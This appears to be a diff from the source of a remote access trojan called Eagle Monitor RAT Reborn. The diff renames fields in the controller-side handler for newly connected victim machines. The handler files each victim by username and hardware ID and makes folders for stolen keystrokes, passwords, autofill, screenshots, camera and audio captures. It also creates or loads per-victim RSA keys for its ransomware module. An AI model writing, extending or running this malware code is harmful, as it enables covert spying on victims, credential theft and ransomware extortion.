@@ -20,28 +20,28 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
         public ConnectedPacketHandler(ConnectedPacket connectedPacket, ClientHandler clientHandler)
         {
             clientHandler.HWID = connectedPacket.HWID;
-            connectedPacket.baseIp = clientHandler.IP;
+            connectedPacket.BaseIp = clientHandler.IP;
 
-            clientHandler.clientPath = Misc.Utils.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID;
-            clientHandler.fullName = connectedPacket.Username + "@" + connectedPacket.HWID;
+            clientHandler.ClientPath = Misc.Utils.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID;
+            clientHandler.FullName = connectedPacket.Username + "@" + connectedPacket.HWID;
 
             Task.Run(() =>
             {
                 if (!Directory.Exists(Misc.Utils.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID))
                 {
                     Directory.CreateDirectory(Misc.Utils.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID);
-                    clientHandler.clientStatus = "New client connected !";
+                    clientHandler.ClientStatus = "New client connected !";
 
-                    Directory.CreateDirectory(clientHandler.clientPath + "\\Downloaded Files\\");
-                    Directory.CreateDirectory(clientHandler.clientPath + "\\History\\");
-                    Directory.CreateDirectory(clientHandler.clientPath + "\\Autofill\\");
-                    Directory.CreateDirectory(clientHandler.clientPath + "\\Keystrokes\\");
-                    Directory.CreateDirectory(clientHandler.clientPath + "\\Keywords\\");
-                    Directory.CreateDirectory(clientHandler.clientPath + "\\Passwords\\");
-                    Directory.CreateDirectory(clientHandler.clientPath + "\\Audio Records\\");
-                    Directory.CreateDirectory(clientHandler.clientPath + "\\Screenshots\\");
-                    Directory.CreateDirectory(clientHandler.clientPath + "\\Camera\\");
-                    Directory.CreateDirectory(clientHandler.clientPath + "\\Ransomware\\");
+                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Downloaded Files\\");
+                    Directory.CreateDirectory(clientHandler.ClientPath + "\\History\\");
+                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Autofill\\");
+                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Keystrokes\\");
+                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Keywords\\");
+                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Passwords\\");
+                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Audio Records\\");
+                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Screenshots\\");
+                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Camera\\");
+                    Directory.CreateDirectory(clientHandler.ClientPath + "\\Ransomware\\");
 
                     if (Program.settings.autoGenerateRSAKey)
                     {
@@ -51,15 +51,15 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
                         encryptionInformation.privateRSAServerKey = rsaKey["PrivateKey"];
 
                         string rsa = JsonConvert.SerializeObject(encryptionInformation);
-                        File.WriteAllText(clientHandler.clientPath + "\\Ransomware\\encryption.json", rsa);
-                        clientHandler.encryptionInformation = encryptionInformation;
+                        File.WriteAllText(clientHandler.ClientPath + "\\Ransomware\\encryption.json", rsa);
+                        clientHandler.EncryptionInformation = encryptionInformation;
                     }
 
                 }
                 else
                 {
-                    clientHandler.clientStatus = "Old client connected !";
-                    if (!File.Exists(clientHandler.clientPath + "\\Ransomware\\encryption.json") && Program.settings.autoGenerateRSAKey)
+                    clientHandler.ClientStatus = "Old client connected !";
+                    if (!File.Exists(clientHandler.ClientPath + "\\Ransomware\\encryption.json") && Program.settings.autoGenerateRSAKey)
                     {
                         Misc.EncryptionInformation encryptionInformation = new Misc.EncryptionInformation();
                         Dictionary<string, string> rsaKey = Misc.Encryption.GetKey();
@@ -67,15 +67,15 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
                         encryptionInformation.privateRSAServerKey = rsaKey["PrivateKey"];
 
                         string rsa = JsonConvert.SerializeObject(encryptionInformation);
-                        File.WriteAllText(clientHandler.clientPath + "\\Ransomware\\encryption.json", rsa);
-                        clientHandler.encryptionInformation = encryptionInformation;
+                        File.WriteAllText(clientHandler.ClientPath + "\\Ransomware\\encryption.json", rsa);
+                        clientHandler.EncryptionInformation = encryptionInformation;
                     }
                     else
                     {
                         if (Program.settings.autoGenerateRSAKey)
                         {
-                            Misc.EncryptionInformation encryptionInformation = JsonConvert.DeserializeObject<Misc.EncryptionInformation>(File.ReadAllText(clientHandler.clientPath + "\\Ransomware\\encryption.json"));
-                            clientHandler.encryptionInformation = encryptionInformation;
+                            Misc.EncryptionInformation encryptionInformation = JsonConvert.DeserializeObject<Misc.EncryptionInformation>(File.ReadAllText(clientHandler.ClientPath + "\\Ransomware\\encryption.json"));
+                            clientHandler.EncryptionInformation = encryptionInformation;
                         }
                     }
                 }
@@ -105,24 +105,24 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
 
                     if (connectedPacket.Is64Bit == "32")
                     {
-                        clientHandler.is64bitClient = false;
+                        clientHandler.Is64bitClient = false;
                     }
                     else
                     {
-                        clientHandler.is64bitClient = true;
+                        clientHandler.Is64bitClient = true;
                     }
 
                     if (connectedPacket.Privilege == "User")
                     {
-                        clientHandler.isAdmin = false;
+                        clientHandler.IsAdmin = false;
                     }
                     else
                     {
-                        clientHandler.isAdmin = true;
+                        clientHandler.IsAdmin = true;
                     }
 
-                    row.Cells["Column10"].Value = clientHandler.serverPort.ToString();
-                    clientHandler.clientRow = row;
+                    row.Cells["Column10"].Value = clientHandler.ServerPort.ToString();
+                    clientHandler.ClientRow = row;
                     Program.mainForm.clientDataGridView.ClearSelection();
 
                 }));
